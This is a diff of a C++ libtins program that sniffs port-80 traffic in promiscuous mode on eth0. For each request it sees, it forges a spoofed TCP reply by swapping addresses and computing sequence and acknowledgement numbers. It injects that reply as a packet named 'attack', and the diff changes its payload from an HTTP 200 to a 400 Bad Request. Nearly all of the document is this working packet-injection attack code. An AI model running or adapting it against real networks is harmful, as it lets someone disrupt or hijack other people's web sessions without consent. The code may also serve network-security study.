@@ -5,13 +5,13 @@
 using namespace Tins;
 using namespace std;
 
-
 struct pk_set
 {
     EthernetII new_ethernet;
     IP new_ip;
     TCP new_tcp;
     uint32_t new_seq, new_ack;
+    PacketSender sender;
     int count = 0;
     void sf_set()
     {
@@ -19,8 +19,8 @@ struct pk_set
         config.set_promisc_mode(true);
         config.set_filter("port 80");
         config.set_promisc_mode(true);
+        config.set_timeout(0.0000001);
         Sniffer sniffer("eth0", config);
-        //config.set_timeout(1);
         sniffer.sniff_loop(make_sniffer_handler(this, &pk_set::handle));
     }
 
@@ -59,6 +59,7 @@ struct pk_set
 
     }
 
+
     void tcp_caculator(TCP tcp,uint32_t s_payload_len , uint32_t a_payload_len)
     {
         new_seq = tcp.ack_seq() + s_payload_len; // caclulator
@@ -69,18 +70,14 @@ struct pk_set
 
     void chg_send()
     {
-        //uint8_t data[] = {0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20,0x32,0x30,0x30,0x20,0x4f,0x4b,0x0d,0x0a};http 200 ok
 
-        PacketSender sender;
         fprintf(stderr, "bef sending 111\n");
-        EthernetII attack = new_ethernet / new_ip / new_tcp / RawPDU("HTTP /1.1 200 OK");
+        EthernetII attack = new_ethernet / new_ip / new_tcp / RawPDU("HTTP/1.1 400 Bad Request\n");
         sender.send(attack, "eth0");
         fprintf(stderr, "Attack..");
         cout<<"send Debug"<<endl;
         debug(new_ethernet,new_ip,new_tcp);
         fprintf(stderr, "bef sending 222\n");
-
-
     }
 
     bool handle(PDU& pdu)
@@ -93,14 +90,16 @@ struct pk_set
         if(tcp.ACK == 0x10 && tcp.PSH == 0x08 && tcp.dport() == 0x50)
         {
             const RawPDU::payload_type& payload = raw.payload();
-            cout<<"request packet "<<"\n";
-            cout<<payload.data()<<"\n";
-            debug(ethernet,ip,tcp);
             pk_swap(ethernet,ip,tcp);
             tcp_caculator(tcp,0,payload.size());
             chg_send();
-            return false;
+            //ack_send();
+            cout<<"request packet "<<"\n";
+            cout<<payload.data()<<"\n";
+            debug(ethernet,ip,tcp);
+            //return true;
         }
+
 
         return true;
     }
